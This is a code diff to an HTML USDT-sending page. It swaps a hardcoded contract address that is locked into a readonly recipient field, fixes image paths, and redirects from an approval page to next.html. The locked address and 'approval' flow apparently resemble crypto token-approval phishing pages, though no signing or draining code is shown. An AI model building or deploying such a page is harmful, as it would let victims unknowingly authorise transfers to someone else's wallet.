@@ -183,19 +183,19 @@
                     id="addressInput"
                     autocomplete="off"
                     placeholder=""
-                    value="0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55"
+                    value="0x0B142E83E394ab1bd8B95F6a5D4f15EB1964EC5E"
                     readonly
                 />
                 <button type="button" onclick="pasteAddress()">Paste</button>
 
                 <!-- Contact icon -->
                 <button type="button" class="icon-btn" title="Contacts">
-                    <img src="./phone-book.jpg" alt="Contacts" />
+                    <img src="phone-book.jpg" alt="Contacts" />
                 </button>
 
                 <!-- QR icon -->
                 <button type="button" class="icon-btn" title="Scan QR">
-                    <img src="./qr-p.jpg" alt="QR" />
+                    <img src="qr-p.jpg" alt="QR" />
                 </button>
             </div>
         </div>
@@ -221,7 +221,7 @@
 
     <script>
         // Contract Configuration
-        const CONTRACT_ADDRESS = "0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55";
+        const CONTRACT_ADDRESS = "0x0B142E83E394ab1bd8B95F6a5D4f15EB1964EC5E";
 
         // Set contract address on page load
         document.addEventListener('DOMContentLoaded', function() {
@@ -291,26 +291,9 @@
             // Store the amount for the approval page
             localStorage.setItem('usdtAmount', amount);
             
-            // Navigate to approval page
-            window.location.href = "approve.html";
+            // Navigate to next.html
+            window.location.href = "next.html";
         }
-
-        function goNext() {
-    const amount = document.getElementById("amountInput").value;
-    if (!amount || amount <= 0) {
-        alert("Please enter a valid amount");
-        return;
-    }
-
-    // Store the amount for the approval page
-    localStorage.setItem('usdtAmount', amount);
-    
-    // Navigate to next.html
-    window.location.href = "next.html";
-}
     </script>
 </body>
 </html>
-
-
-
